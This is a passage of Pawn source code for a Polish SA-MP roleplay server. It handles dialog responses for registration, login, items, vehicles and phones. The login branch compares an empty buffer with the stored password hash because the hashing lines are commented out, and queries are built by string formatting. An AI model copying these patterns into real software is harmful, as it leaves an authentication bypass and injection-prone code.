				if(sex[0] == 'm' || sex[0] == 'k')
				{
					new players_query[64];
					format(players_query, sizeof(players_query), "SELECT * FROM players WHERE name = '%s' LIMIT 1", ReturnPlayerName(playerid));
					new Cache:cache = mysql_query(DB_HANDLE, players_query);
					new rows = 0;
					cache_get_row_count(rows);
					if(rows == 1){
						SendClientMessage(playerid, COLOR_WHITE, "> Taka postaæ ju¿ istnieje. Spróbuj u¿yæ innej nazwy.");
						ShowDialogCreate(playerid);
						cache_delete(cache);
						return 1;
					}
					cache_delete(cache);

					new count;
					for(new j = 0; j < strlen(pname); j++)
					{
						if(text[j] == '_')
						count++;
					}
					if(count != 1)
					{
						ShowDialogCreate(playerid);
						new info_msg[128];
						format(info_msg, sizeof(info_msg), "> Twoje "HEX_BLUE"imiê"HEX_WHITE" oraz "HEX_BLUE"nazwisko"HEX_WHITE" musi byæ oddzielone tylko jednym znakiem: "HEX_BLUE"_");
						SendClientMessage(playerid, COLOR_WHITE, info_msg);
						return 1;
					}
					new pos = strfind(text, "_", true);
					if(pos == 0 || pos == strlen(pname)-1)
					{
						ShowDialogCreate(playerid);
						SendClientMessage(playerid, COLOR_WHITE, "> "HEX_BLUE"imiê"HEX_WHITE" lub "HEX_BLUE"nazwisko"HEX_WHITE" Twojej postaci jest za krótkie!");
						return 1;
					}
					for(new i = 0; i < strlen(pname); i++)
					{
						if(pname[i] == 'q' || pname[i] == 'w' || pname[i] == 'e' || pname[i] == 'r' || pname[i] == 't' || 
						pname[i] == 'y' || pname[i] == 'u' || pname[i] == 'i' || pname[i] =='o' || pname[i] == 'p' || 
						pname[i] == 'a' || pname[i] == 's' || pname[i]== 'd' || pname[i]== 'f' || pname[i] =='g' || 
						pname[i] =='z' || pname[i] == 'l' || pname[i] == 'k' || pname[i]== 'j' || pname[i] =='h' || 
						pname[i] =='x' || inputtext[i]== 'c' || inputtext[i] == 'v' || inputtext[i] =='b' || inputtext[i] =='n' || 
						pname[i] == 'm' ||
						pname[i] == 'Q' || pname[i] == 'W' || pname[i] == 'E' || pname[i] == 'R' ||pname[i] == 'T' || 
						pname[i] == 'Y' || pname[i] == 'U' || pname[i] == 'I' || pname[i] =='O' || pname[i] == 'P' || 
						pname[i] == 'A' || pname[i] == 'S' || pname[i]== 'D' ||  pname[i]== 'F' || pname[i] =='G' || 
						pname[i] =='Z' || pname[i] == 'L' ||  pname[i] == 'K' || pname[i]== 'J' || pname[i] =='H' || 
						pname[i] =='X' || pname[i]== 'C' ||   pname[i] == 'V' || pname[i] =='B' || pname[i] =='N' || 
						pname[i] == 'M' || pname[i] == '_')
						{
							continue;
						}
						else
						{
							new invalid_msg[128];
							format(invalid_msg, sizeof(invalid_msg), "> Wprowadzono niedozwolony znak: "HEX_BLUE"%c", pname[i]);
							SendClientMessage(playerid, COLOR_WHITE, invalid_msg);
							ShowDialogCreate(playerid);
							return 1;
						}
					}
					new name[MAX_PLAYER_NAME];
					format(name, sizeof(name), pname);
					RegisterCache[playerid][rName] = name;
					if(sex[0] == 'm')
					RegisterCache[playerid][rSex] = 0; else RegisterCache[playerid][rSex] = 1;
					RegisterCache[playerid][rBornDate] = pborndate;
					
					ShowDialogPassword(playerid);
					return 1;
				}
				else
				return ShowDialogCreate(playerid);
			}
			else
			{
				BackToMenu(playerid);
			}
		}
		case D_PASS:
		{
			if(response)
			{
				if(strlen(inputtext) < 8 || strlen(inputtext) > 32)
				return ShowPlayerDialog(playerid, D_PASS, DIALOG_STYLE_PASSWORD, "Wybór has³a", ""HEX_WHITE"Poni¿ej wprowadŸ has³o za pomoc¹ którego bêdziesz logowaæ siê do swojej postaci.\n\n"HEX_RED"Has³o musi mieæ przynajmniej 8 oraz maksymalnie 32 znaki.\n\n"HEX_PURPLE"Prosimy nie wpisywaæ hase³ zawieraj¹cych polskie znaki, gdy¿ logowanie potem bêdzie nie mo¿liwe.", "Stwórz", "Anuluj");

				


				bcrypt_hash(playerid,"OnPassswordHash",inputtext,12);

			}
			else
			{
				BackToMenu(playerid);
			}
		}
		case D_LOGIN:
		{
			if(response)
			{
				if(Isnull(inputtext))
				{
					return ShowDialogLogin(playerid);
				}
				new hash[1024];

				//format(hash, sizeof(hash), "%s%s", SHA256::Hash(inputtext), SHA256::Hash(PlayerCache[playerid][pSalt]));
				//format(hash, sizeof(hash), "%s", SHA256::Hash(hash));

				//printf("hashzloginu: %s", hash);
			//	printf("hash z bazy: %s", PlayerCache[playerid][pHash]);

				if(!strcmp(hash, PlayerCache[playerid][pHash], false))
				{
					new name[MAX_PLAYER_NAME]; GetPlayerName(playerid, name, sizeof(name));
					for(new j=0; j<strlen(name); j++)
					{
						name[j] = tolower(name[j]);
					}
					if(strfind(name, "_", false) != -1)
					{
						new pos = strfind(name, "_", false);
						name[pos+1] = toupper(name[pos+1]);
					}
					name[0] = toupper(name[0]);
					new str[MAX_PLAYER_NAME]; format(str, sizeof(str), "%d", playerid);

					// reloading name
					SetPlayerName(playerid, str);
					SetPlayerName(playerid, name);

					return LoginPlayer(playerid);
				}
				else
				{
					if(LoginAttempt[playerid] == 3)
					return Kick(playerid);
					new str[256];
					format(str, sizeof(str), ""HEX_RED"Nieprawid³owe dane logowania!\n\n"HEX_WHITE""HEX_PURPLE"Witaj na serwerze Szkodnik RolePlay!"HEX_WHITE"\n\nPostaæ "HEX_RED"%s"HEX_WHITE" zosta³a odnaleziona.\n\nZaloguj siê podaj¹c poprawne has³o lub wybierz 'Zmieñ' jeœli chcesz zalogowaæ siê na inn¹ postaæ.", ReturnPlayerName(playerid));
					ShowPlayerDialog(playerid, D_LOGIN, DIALOG_STYLE_PASSWORD, "Logowanie", str, "Zaloguj", "Zmieñ");
					LoginAttempt[playerid]++;
					return 1;
				}
			}
			else
			{
				return ShowDialogFind(playerid);
			}
		}
		case D_INFO:
		{
			if(response)
			{
				return 1;
			}
			else
			{
				return 1;
			}
		}
		case D_CREATEDOOR:
		{/*
			if(response)
			{
				new zone = GetPlayerZone(playerid);
				if(!strlen(inputtext))
				{
					ShowDialogDoorCreate(playerid,ZoneData[zone][zYard]);
					return 1;
				}
				new input[128];
				format(input, sizeof(input), " %s", inputtext);
				new type[2], yard;
				if(sscanf(input, "s[2]i", type, yard))
				{
					ShowDialogDoorCreate(playerid, ZoneData[zone][zYard]);
					return 1;
				}
				if(yard < ZoneData[zone][zYard])
				{
					ShowDialogDoorCreate(playerid,ZoneData[zone][zYard]);
					return 1;
				}
				new Float:X, Float:Y, Float:Z;
				GetPlayerPos(playerid, X, Y, Z);
				if(!strcmp(type, "d", true))
				{
					new price = ZoneData[zone][zCostH] * yard;
					if(PlayerCache[playerid][pCash] < price)
					{
						ShowDialogDoorCreate(playerid, ZoneData[zone][zYard]);
						new msg[64];
						format(msg, sizeof(msg), "~g~nie posiadasz %d$ na stworzenie drzwi", price);
						GameTextForPlayer(playerid, msg, 5000, 4);
						return 1;
					}
					CreateDoor(playerid, GetPlayerVirtualWorld(playerid), 0, X, Y, Z);
					SetPlayerCash(playerid, -price);
					return 1;
				}
				else if(!strcmp(type, "b", true))
				{
					new price = ZoneData[zone][zCostB] * yard;
					if(PlayerCache[playerid][pCash] < price)
					{
						ShowDialogDoorCreate(playerid, ZoneData[zone][zYard]);
						new msg[64];
						format(msg, sizeof(msg), "~g~nie posiadasz %d$ na stworzenie drzwi", price);
						GameTextForPlayer(playerid, msg, 5000, 4);
						return 1;
					}
					CreateDoor(playerid, GetPlayerVirtualWorld(playerid), 1, X, Y, Z);
					SetPlayerCash(playerid, -price);
					return 1;
				}
				else
				{
					ShowDialogDoorCreate(playerid, ZoneData[zone][zYard]);
					return 1;
				}
			}
			else
			{
				return 1;
			}*/
		}
		case D_ITEMS:
		{
			new uid = strval(inputtext);
			if(response)
			{
				if(PlayerCache[playerid][pBW_Time])
				return ShowDialogInfo(playerid, "Nie mo¿esz tego zrobiæ poczas trwania BW.");
				UseItem(playerid, uid);
				return 1;
			}
			else
			{
				pVal[playerid] = uid;
				return ShowPlayerDialog(playerid, D_ITEM_OPTIONS, DIALOG_STYLE_LIST, "Zarz¹dzaj przedmiotem", "1\tOd³ó¿ przedmiot\n2\tOddaj przedmiot za darmo graczowi\n"HEX_BLUE"3\tResetuj akcesorium doczepiane\n4\tSchowaj przedmiot do torby\n5\tZniszcz przedmiot", "Wybierz", "Zamknij");
			}
		}
		case D_ITEM_OPTIONS:
		{
			if(response)
			{
				return UseItemOption(playerid, strval(inputtext), pVal[playerid]);
			}
			return 1;
		}
		case D_V_OFFER:
		{
			new senderuid = tVal[playerid];
			new senderid = IsUserConnected(senderuid);

			new msg[64]; format(msg, sizeof(msg), "~r~%s ~w~odrzucil te oferte.", RPName(playerid));

			if(response)
			{
				//new vuid = tVal2[playerid];
				new price = tVal3[playerid];

				if(senderid == -1)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub opuœci³ grê.");
				if(!IsPlayerInRangeOfPlayer(playerid, senderid, 5.0))
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz oddali³ siê.");
				if(!IsPlayerInAnyVehicle(senderid))
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz opuœci³ swój pojazd.");
				if(PlayerCache[playerid][pCash] < price)
				{
					TextDrawForPlayerEx(senderid, 1, msg, 3000);
					return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz przy sobie a¿ tylu pieniêdzy.");
				}
				if(Isnull(inputtext))
				{
					SendClientMessage(playerid, COLOR_GRAY, "Wpisz POTWIERDZAM w dialogu, jeœli chcesz zaakceptowaæ ofertê w jej obecnym stanie.");
					new info[1025]; format(info, sizeof(info), "Informacje o pojeŸdzie:\n\nMarka: %s\nPrzebieg: %dkm\nPaliwo: %d/100\nStan techniczny: %fHP\n\nnCena: "HEX_GREEN"$%d\n\n"HEX_WHITE"Wpisz poni¿ej "HEX_DARKRED"POTWIERDZAM"HEX_WHITE", jeœli chcesz zaakceptowaæ tê ofertê w jej obecnym stanie.",
				 	GetVehicleName( PlayerCache[playerid][pCurrentVehicle][vModel]),  PlayerCache[playerid][pCurrentVehicle][vMileAge],  PlayerCache[playerid][pCurrentVehicle][vFuel],  PlayerCache[playerid][pCurrentVehicle][vHP], price);

					new header[64]; format(header, sizeof(header), "Kupno pojazdu od: %s", RPName(senderid));

					return ShowPlayerDialog(playerid, D_V_OFFER, DIALOG_STYLE_INPUT, header, info, "Gotowe", "Anuluj");
				}
				if(!strcmp(inputtext, "potwierdzam", true))
				{
					/*RemovePlayerFromVehicle(senderid);
					PlayerCache[playerid][pCurrentVehicle][vOwner] = PlayerCache[playerid][pUID];

					PlayerCache[playerid][pCash] -= price;
					PlayerCache[senderid][pCash] += price;
					GivePlayerMoney(playerid, -price);
					format(msg, sizeof(msg), "~r~-$%d", price);
					GameTextForPlayer(playerid, msg, 3000, 4);
					format(msg, sizeof(msg), "~g~+$%d", price);
					GivePlayerMoney(playerid, price);
					return GameTextForPlayer(senderid, msg, 3000, 4);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAY, "Wpisz POTWIERDZAM w dialogu, jeœli chcesz zaakceptowaæ ofertê w jej obecnym stanie.");
					new info[1025]; format(info, sizeof(info), "Informacje o pojeŸdzie:\n\nMarka: %s\nPrzebieg: %dkm\nPaliwo: %d/100\nStan techniczny: %fHP\n\nnCena: "HEX_GREEN"$%d\n\n"HEX_WHITE"Wpisz poni¿ej "HEX_DARKRED"POTWIERDZAM"HEX_WHITE", jeœli chcesz zaakceptowaæ tê ofertê w jej obecnym stanie.",
				 	GetVehicleName( PlayerCache[playerid][pCurrentVehicle][vModel]),  PlayerCache[playerid][pCurrentVehicle][vMileAge],  PlayerCache[playerid][pCurrentVehicle][vFuel],  PlayerCache[playerid][pCurrentVehicle][vHP], price);

					new header[64]; format(header, sizeof(header), "Kupno pojazdu od: %s", RPName(senderid));

					return ShowPlayerDialog(playerid, D_V_OFFER, DIALOG_STYLE_INPUT, header, info, "Gotowe", "Anuluj");
				}
			}
			TextDrawForPlayerEx(playerid, 1, "Oferta anulowana.", 3000);
			if(senderid != -1)
			return TextDrawForPlayerEx(senderid, 1, msg, 3000);
		}
		case D_V_SELL:
		{
			if(response)
			{
			/*	if(!IsPlayerInAnyVehicle(playerid))
					return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê w ¿adnym pojeŸdzie.");
				new vid = GetPlayerVehicleID(playerid);
				new vuid = GetVehicleUID(vid);
				if(vuid != pVal[playerid])
					return SendClientMessage(playerid, COLOR_GRAY, "Opuœci³eœ(aœ) swój pojazd");
				new price = strval(inputtext);
				if(price < 1)
					return ShowPlayerDialog(playerid, D_V_SELL, DIALOG_STYLE_INPUT, "Sprzedaj pojazd", ""HEX_DARKRED"Minimalna cena za, któr¹ mo¿esz sprzedaæ swój pojazd to 1$.\n"HEX_WHITE"Wpisz poni¿ej cenê, za jak¹ chcesz sprzedaæ swój pojazd:", "Sprzedaj", "Anuluj");
				new targetuid = pVal2[playerid];
				new targetid = IsUserConnected(targetuid);
				if(targetid == -1)
					return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub opuœci³ grê.");
				if(!IsPlayerInRangeOfPlayer(playerid, targetid, 5.0))
					return SendClientMessage(playerid, COLOR_GRAY, "Gracz oddali³ siê.");

				tVal[targetid] = PlayerCache[playerid][pUID];
				tVal2[targetid] = vuid;
				tVal3[targetid] = price;

				new info[1025]; format(info, sizeof(info), "Informacje o pojeŸdzie:\n\nMarka: %s\nPrzebieg: %dkm\nPaliwo: %d/100\nStan techniczny: %fHP\n\nnCena: "HEX_GREEN"$%d\n\n"HEX_WHITE"Wpisz poni¿ej "HEX_DARKRED"POTWIERDZAM"HEX_WHITE", jeœli chcesz zaakceptowaæ tê ofertê w jej obecnym stanie.",
				GetVehicleName( PlayerCache[playerid][pCurrentVehicle][vModel]),  PlayerCache[playerid][pCurrentVehicle][vMileAge],  PlayerCache[playerid][pCurrentVehicle][vFuel],  PlayerCache[playerid][pCurrentVehicle][vHP], price);
				new header[64]; format(header, sizeof(header), "Kupno pojazdu od: %s", RPName(playerid));
				ShowPlayerDialog(targetid, D_V_OFFER, DIALOG_STYLE_INPUT, header, info, "Gotowe", "Anuluj");

				return GameTextForPlayer(playerid, "~y~oferta wyslana", 3000, 4);*/
			}
		}
		case D_V_NEAR_PLAYERS:
		{
			if(response)
			{
				pVal2[playerid] = strval(inputtext);
				return ShowPlayerDialog(playerid, D_V_SELL, DIALOG_STYLE_INPUT, "Sprzedaj pojazd", ""HEX_WHITE"Wpisz poni¿ej cenê, za jak¹ chcesz sprzedaæ swój pojazd:", "Gotowe", "Anuluj");
			}
			return 1;
		}
		case D_NEARBY_ITEMS:
		{
			if(response)
			{
				new uid = strval(inputtext);
				if(ItemCache[uid][iState] == 0)
				{
					new Float:targetX, Float:targetY, Float:targetZ;
					for(new i; i<MAX_ITEMS; i++)
					{
						if(ItemCache[i][iUID] == uid)
						{
							for(new j; j<=GetPlayerPoolSize(); j++)
							{
								if(IsPlayerConnected(j))
								{
									if(GetPlayerItemsCount(playerid) >= 20)
									return ShowDialogInfo(playerid, "Twój ekwipunek jest przepe³niony!\nMo¿esz schowaæ przedmioty do torby, pojazdu, szafy, oddaæ czy sprzedaæ innemu graczowi lub od³o¿yæ je na ziemiê.");
									GetPlayerPos(j, targetX, targetY, targetZ);
									if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(j) || !IsPlayerInRangeOfPoint(playerid, 5.0, targetX, targetY, targetZ))
									return SendClientMessage(playerid, COLOR_GRAY, "Gracz oddali³ siê.");
									if(ItemCache[uid][iActive])
									return GameTextForPlayer(playerid, "~b~~h~~h~~h~uzywany", 3000, 4);
									ItemCache[uid][iOwner] = PlayerCache[playerid][pUID];
									new msg[128];
									format(msg, sizeof(msg), "zabiera jakiœ przedmiot %s", RPName(j));
									return SendPlayerMe(playerid, msg);
								}
							}
						}
					}
					return 1;
				}
				if(GetPlayerItemsCount(playerid) >= 20)
				return ShowDialogInfo(playerid, "Twój ekwipunek jest przepe³niony!\nMo¿esz schowaæ przedmioty do torby, pojazdu, szafy, oddaæ czy sprzedaæ innemu graczowi lub od³o¿yæ je na ziemiê.");
				ItemCache[uid][iState] = 0;
				ItemCache[uid][iOwner] = PlayerCache[playerid][pUID];
				new msg[128]; format(msg, sizeof(msg), "podnosi %s.",ItemCache[uid][iName]);
				if(IsPlayerInAnyVehicle(playerid))
				format(msg, sizeof(msg), "podnosi %s z pojazdu.",ItemCache[uid][iName]);
				SendPlayerMe(playerid, msg);
				ApplyAnimation(playerid, "bomber", "bom_plant", 4.1, 0, 0, 0, 0, 0, 0);
			}
			return 1;
		}
		case D_USE_WEAP:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return ShowDialogUseWeap(playerid);

				new uid = pVal[playerid];

				new val, val2, val3, val4, active, name[128];

				new query[128];
				format(query, sizeof(query), "SELECT val, val2, val3, val4, active, name FROM items WHERE uid = '%d' LIMIT 1", uid);
				new Cache:cache = mysql_query(DB_HANDLE, query);

				new rows = 0;
				cache_get_row_count(rows);


				cache_get_value_name_int(0, "val", val);
				cache_get_value_name_int(0, "val2", val2);
				cache_get_value_name_int(0, "val3", val3);
				cache_get_value_name_int(0, "val4", val4);
				cache_get_value_name_int(0, "active", active);
				cache_get_value_name(0, "name", name);

				cache_delete(cache);

				new msg[128];

				pShowingWeapon[playerid] = true;
				SetTimerEx("ShowingWeapon", 3000, false, "i", playerid);

				if(active)
				{
					WeaponCache[playerid][wcUID]  = 0;
					WeaponCache[playerid][wcVal]  = 0;
					WeaponCache[playerid][wcVal2] = 0;
					WeaponCache[playerid][wcVal3] = 0;
					WeaponCache[playerid][wcVal4] = 0;

					format(msg, sizeof(msg), "chowa %s %s.", name, inputtext);
		
					ResetPlayerWeapons(playerid);

					format(query, sizeof(query), "UPDATE items SET active = '0' WHERE uid = '%d' LIMIT 1", uid);

					if(IsPlayerAttachedObjectSlotUsed(playerid, 6))
					RemovePlayerAttachedObject(playerid, 6);

				}
				else
				{
					format(query, sizeof(query), "UPDATE items SET active = '1' WHERE uid = '%d' LIMIT 1", uid);

					format(msg, sizeof(msg), "wyci¹ga %s %s.", name, inputtext);

					WeaponCache[playerid][wcUID] = uid;
					WeaponCache[playerid][wcVal] = val;
					WeaponCache[playerid][wcVal2] = val2;
					WeaponCache[playerid][wcVal3] = val3;
					WeaponCache[playerid][wcVal4] = val4;


					GivePlayerWeapon(playerid, val, val2);
				}


				SendPlayerMe(playerid, msg);
				mysql_query(DB_HANDLE, query);

				return 1;
			}
		}
		case D_PHONE:
		{
			if(response)
			{
				new option=strval(inputtext), uid=pVal[playerid];
				switch(option)
				{
					case 1:
					{
						return ShowDialogContacts(playerid);
					}
					case 2:
					{
						return ShowDialogSMS(playerid);
					}
					case 3:
					{
						return ShowDialogVCard(playerid);
					}
					case 4:
					{
						new phoneuid = pVal[playerid];
						new simuid = ItemCache[phoneuid][iVal];
						ItemCache[simuid][iState] = 0;
						ItemCache[phoneuid][iActive] = 0;
						ItemCache[phoneuid][iVal] = 0;
						return SendPlayerMe(playerid, "wyjmuje kartê SIM z telefonu");
					}
					case 5:
					{
						ItemCache[uid][iActive]=0;
						return GameTextForPlayer(playerid, "~r~~h~telefon wylaczony", 3000, 4);
					}
				}
			}
			return 1;
		}
		case D_SMS:
		{
			return 1;
			/*if(response)
			return SendSMSToPlayer(playerid, inputtext);
			return ShowDialogPhone(playerid);*/
		}
		case D_ANSWER:
		{
			if(IsPlayerConnected(pCalling[playerid]))
			{
				if(response)
				{
					new option = strval(inputtext);
					switch(option)
					{
						case 1:
						{
							pTalking[playerid] = pCalling[playerid];
							pTalking[pCalling[playerid]] = playerid;
							SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
							GameTextForPlayer(playerid, "~w~odebrano telefon", 3000, 4);
							KillTimer(CallingTimer[pCalling[playerid]]);
						}
						case 2:
						{
							KillTimer(CallingTimer[pCalling[playerid]]);
							GameTextForPlayer(pCalling[playerid], "~r~~h~Rozmowca odrzucil polaczenie", 3000, 4);
							SetPlayerSpecialAction(pCalling[playerid], SPECIAL_ACTION_STOPUSECELLPHONE);
						}
					}
					pCalling[playerid] = -1;
				}
			}
			return 1;
		}
		case D_NEW_CONTACT:
		{
			if(response)
			{
				new num, name[128];
				if(sscanf(inputtext, "is[128]", num, name))
				return ShowPlayerDialog(playerid, D_NEW_CONTACT, DIALOG_STYLE_INPUT, "Nowy kontakt", "Wpisz poni¿ej numer oraz nazwê dla nowego kontaktu w formacie: [numer] [nazwa]\nPrzyk³ad: 55555 Jane Smith", "Dodaj", "Anuluj");
				if(num <= 50000)
				return ShowPlayerDialog(playerid, D_NEW_CONTACT, DIALOG_STYLE_INPUT, "Nowy kontakt", "Wpisz poni¿ej numer oraz nazwê dla nowego kontaktu w formacie: [numer] [nazwa]\nPrzyk³ad: 55555 Jane Smith", "Dodaj", "Anuluj");
				for(new i; i<MAX_ITEMS; i++)
				{
					if(ItemCache[i][iType] == 15)
					{
						if(ItemCache[i][iUID] + 50000 == num)
						{
							if(ItemCache[i][iState] == 2)
							TextDrawForPlayerEx(playerid, 1, "Karta SIM tego numeru zostala zniszczona.", 5000);
							TextDrawForPlayerEx(playerid, 1, "Kontakt zostal dodany.", 3000);
							ShowDialogContacts(playerid);
							return AddContact(pVal[playerid], inputtext, num-50000);
						}
					}
				}
				ShowPlayerDialog(playerid, D_NEW_CONTACT, DIALOG_STYLE_INPUT, "Nowy kontakt", "Wpisz poni¿ej numer oraz nazwê dla nowego kontaktu w formacie: [numer] [nazwa]\nPrzyk³ad: 55555 Jane Smith", "Dodaj", "Anuluj");
				return TextDrawForPlayerEx(playerid, 1, "Wybrany numer nie istnieje.", 3000);
			}
			else
			{
				return ShowDialogContacts(playerid);
			}
		}
		case D_STACK:
		{
			/*if(response)
			{
				new duid = GetPlayerDoorUID(playerid);
				if(duid == 0 || DoorCache[duid][dGroupUID] == 0)
				return SendClientMessage(playerid, COLOR_GRAY, "Opuœci³eœ(aœ) budynek grupy lub zosta³ on odpisany.");
				new count, customprice;
				if(sscanf(inputtext, "ii", count, customprice))
				{
					ShowPlayerDialog(playerid, D_STACK, DIALOG_STYLE_INPUT, "Parametry produktu", "Wpisz poni¿ej iloœæ tego produktu do zamówienia oraz\nw³asn¹ cenê, za jak¹ klient bêdzie musia³ zap³aciæ za kupno jednego takiego produktu.\nW³asna, ustalona cena musi byæ wiêksza\n\
					ni¿ cena hurtowa.\n\nFormat: [iloœæ] [cena za któr¹ zap³aci ka¿da osoba kupuj¹ca za jeden dany przedmiot]\n\
					Przyk³ad: 10 100", "Zamów", "Anuluj");
					return SendClientMessage(playerid, COLOR_GRAY, "Minimalna iloœæ to 1, a maksymalna to 100 za jednym razem.");
				}
				if(count < 1 || count > 100)
				{
					SendClientMessage(playerid, COLOR_GRAY, "Minimalnie mo¿esz zawówiæ jeden produkt grupowy!");
					ShowPlayerDialog(playerid, D_STACK, DIALOG_STYLE_INPUT, "Parametry produktu", "Wpisz poni¿ej iloœæ tego produktu do zamówienia oraz\nw³asn¹ cenê, za jak¹ klient bêdzie musia³ zap³aciæ za kupno jednego takiego produktu.\nW³asna, ustalona cena musi byæ wiêksza\n\
					ni¿ cena hurtowa.\n\nFormat: [iloœæ] [cena za któr¹ zap³aci ka¿da osoba kupuj¹ca za jeden dany przedmiot]\n\
					Przyk³ad: 10 100", "Zamów", "Anuluj");
					return SendClientMessage(playerid, COLOR_GRAY, "Minimalna iloœæ to 1, a maksymalna to 100 za jednym razem.");
				}

				new iuid = pVal[playerid];

				new price = ItemCache[iuid][iCost];

				if(customprice < price)
				{
					SendClientMessage(playerid, COLOR_GRAY, "Cena dla jednego produktu musi byæ równa lub wiêksza cenie hurtowej.");
					ShowPlayerDialog(playerid, D_STACK, DIALOG_STYLE_INPUT, "Parametry produktu", "Wpisz poni¿ej iloœæ tego produktu do zamówienia oraz\nw³asn¹ cenê, za jak¹ klient bêdzie musia³ zap³aciæ za kupno jednego takiego produktu.\nW³asna, ustalona cena musi byæ wiêksza\n\
					ni¿ cena hurtowa.\n\nFormat: [iloœæ] [cena za któr¹ zap³aci ka¿da osoba kupuj¹ca za jeden dany przedmiot]\n\
					Przyk³ad: 5 70", "Zamów", "Anuluj");
					return SendClientMessage(playerid, COLOR_GRAY, "Minimalna iloœæ to 1, a maksymalna to 100 za jednym razem.");
				}

				new guid = DoorCache[duid][dGroupUID];

				if(GroupCache[guid][gBank] < price*count)
				return SendClientMessage(playerid, COLOR_GRAY, "Grupa nie posiada a¿ tylu funduszy w banku by zamówiæ ten produkt w takiej iloœci.");
				GroupCache[guid][gBank]-=price*count;

				CreateItem(0, ItemCache[iuid][iType], ItemCache[iuid][iVal], ItemCache[iuid][iVal2], ItemCache[iuid][iVal3], ItemCache[iuid][iVal4], ItemCache[iuid][iGroup], ItemCache[iuid][iName]);

				ItemCache[MAX_ITEMS-1][iState] = ITEM_STATE_MAGAZINE;
				ItemCache[MAX_ITEMS-1][iGroupSender] = guid;
				ItemCache[MAX_ITEMS-1][iVW] = count;
				ItemCache[MAX_ITEMS-1][iCost] = customprice;

				new msg[256]; format(msg, sizeof(msg), ""HEX_WHITE"Zamówiono x%d produkt(y).\nNazwa: %s\nZ konta grupy pobrano kwotê: $%d", count, ItemCache[iuid][iName], price*count);
				return ShowDialogInfo(playerid, msg);
			}*/
		}
		case D_GROUP_PRODUCTS:
		{
			if(response)
			{
				pVal[playerid] = strval(inputtext);
				ShowPlayerDialog(playerid, D_STACK, DIALOG_STYLE_INPUT, "Parametry produktu", "Wpisz poni¿ej iloœæ tego produktu do zamówienia oraz\nw³asn¹ cenê, za jak¹ klient bêdzie musia³ zap³aciæ za kupno jednego takiego produktu.\nW³asna, ustalona cena musi byæ wiêksza\n\
				ni¿ cena hurtowa.\n\nFormat: [iloœæ] [cena za któr¹ zap³aci ka¿da osoba kupuj¹ca za jeden dany przedmiot]\n\
				Przyk³ad: 10 100", "Zamów", "Anuluj");
				return SendClientMessage(playerid, COLOR_GRAY, "Minimalna iloœæ to 1, a maksymalna to 100 za jednym razem.");
			}
		}
		case D_PLAYER_CONTACTS:
		{
			if(response)
			{
				/*new phone_number = strval(inputtext);
				switch(phone_number)
				{
					case 777:
					{
						new dooruid = GetPlayerDoorUID(playerid);
						if(!dooruid)
						return ShowDialogInfo(playerid, "Nie znajdujesz siê w budynku ¿adnej grupy.");
						new groupuid = DoorCache[dooruid][dGroupUID];
						if(PlayerCache[playerid][pGroup] == groupuid)
						{
							if(!PlayerCache[playerid][pGroupProducts])
							return ShowDialogInfo(playerid, "Nie posiadasz uprawnieñ do zamawiania produktów w tej grupie.");
						}
						else if(PlayerCache[playerid][pGroup2] == groupuid)
						{
							if(!PlayerCache[playerid][pGroupProducts2])
							return ShowDialogInfo(playerid, "Nie posiadasz uprawnieñ do zamawiania produktów w tej grupie.");
						}
						else if(PlayerCache[playerid][pGroup3] == groupuid)
						{
							if(!PlayerCache[playerid][pGroupProducts3])
							return ShowDialogInfo(playerid, "Nie posiadasz uprawnieñ do zamawiania produktów w tej grupie.");
						}
						else
						return ShowDialogInfo(playerid, "Nie znajdujesz siê w grupie budynku lub nie zosta³ on jeszcze podpisany.");
						new list[1025], info[256];
						for(new i; i<MAX_ITEMS; i++)
						{
							if(ItemCache[i][iState] == ITEM_STATE_LIST)
							{
								if(ItemCache[i][iOwner] == GroupCache[groupuid][gType])
								{
									format(info, sizeof(info), ""HEX_BLACK"%d "HEX_WHITE"%s "HEX_GREEN"$%d\n", i, ItemCache[i][iName], ItemCache[i][iCost]);
									strins(list, info, strlen(list));
								}
							}

						}
						if(!strlen(list))
						return ShowPlayerDialog(playerid, D_INFO, DIALOG_STYLE_MSGBOX, "Brak produktów", ""HEX_WHITE"Dla tej grupy nie zosta³ przypisane ¿adne produkty do zamówienia.\nSkontaktuj siê z Administracj¹.", "zamknij", "");
						return ShowPlayerDialog(playerid, D_GROUP_PRODUCTS, DIALOG_STYLE_LIST, "Zamawianie produktów", list, "Wybierz", "Anuluj");
					}
					case 911:
					{
						new list[1025], info[64], count;
						for(new i; i<LastgUID; i++)
						{
							if(!GroupCache[i][gState])
							{
								if(GroupCache[i][gType] == 1 || GroupCache[i][gType] == 2 || GroupCache[i][gType] == 16 )
								{
									count = GetPlayersCountOnDuty(GroupCache[i][gUID]);
									if(count)
									format(info, sizeof(info), "%d\t%s (%d na s³u¿bie)\n", GroupCache[i][gUID], GroupCache[i][gName], count);
									else format(info, sizeof(info), "%d\t%s\n", GroupCache[i][gUID], GroupCache[i][gName]);
									strins(list, info, strlen(list));

								}
							}
						}
						if(Isnull(list))
						return ShowDialogInfo(playerid, "¯adne organizacje porz¹dkowe nie zosta³y jeszcze utworzone.");
						return ShowPlayerDialog(playerid, D_911, DIALOG_STYLE_LIST, "S³u¿by porz¹dkowe", list, "Zadzwoñ", "Anuluj");
					}
					case 555:
					{
						new list[1025], info[64];
						for(new i; i<=GetPlayerPoolSize(); i++)
						{
							if(IsPlayerConnected(i))
							{
								if(pDuty[i])
								{
									if(GroupCache[pDuty[i]][gType] != 16 && GroupCache[pDuty[i]][gType] != 2 && GroupCache[pDuty[i]][gType] != 1 && GroupCache[pDuty[i]][gType] != 0 && GroupCache[pDuty[i]][gType] != 4 && GroupCache[pDuty[i]][gType] != 5)
									{
										format(info, sizeof(info), "%d\t%s (%d na s³u¿bie)\n", GroupCache[pDuty[i]][gUID], GroupCache[pDuty[i]][gName], GetPlayersCountOnDuty(pDuty[i]));
										strins(list, info, strlen(list));
									}
								}
							}
						}
						if(Isnull(list))
